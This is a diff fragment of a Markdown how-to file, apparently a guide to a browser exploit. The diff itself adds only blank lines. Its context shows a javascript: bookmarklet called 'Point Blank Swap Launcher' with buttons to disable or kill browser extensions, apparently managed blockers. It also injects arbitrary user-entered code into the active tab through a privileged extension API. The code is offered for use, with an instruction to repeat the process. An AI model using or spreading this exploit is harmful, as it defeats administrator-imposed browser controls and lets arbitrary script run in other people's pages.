@@ -14,6 +14,7 @@ url**
 
 
 
+
 javascript: (document = window.document), document.write( "<html> <body> <center><head> <h1>[Point Blank Swap Launcher]</h1><center><h1>---Disabling---</h1></center>\n<center><button
 id='soft'>Soft Disable</button></center><center><button id='hard'>Hard Kill</button></center><center><button id='reload'>Reload Blocker</button></center><center><center><h1> ---Scripts---
 </h1></center><center><button id='hide'>Hide tabs</button><button id='cool'>Create cool looking window</button></center><center><h3> Custom Notification </h3> </center> <input id='title' placeholder='Put
@@ -49,6 +50,7 @@ document.getElementById("soft").innerHTML = "Disabled"; opener.chrome.extension.
 opener.chrome.browserAction.onClicked.addListener(() => { opener.chrome.tabs.query( { active: true, currentWindow: true }, (tab) => { opener.chrome.tabs.executeScript(tab[0].id, {
 code: %60 %60 + document.getElementById("code").value, matchAboutBlank: true, }); } ); }); alert("Everytime you click your extension, your code will show"); }, !1 );
 
+ 
  
   
 **Repeat the same process for this one.
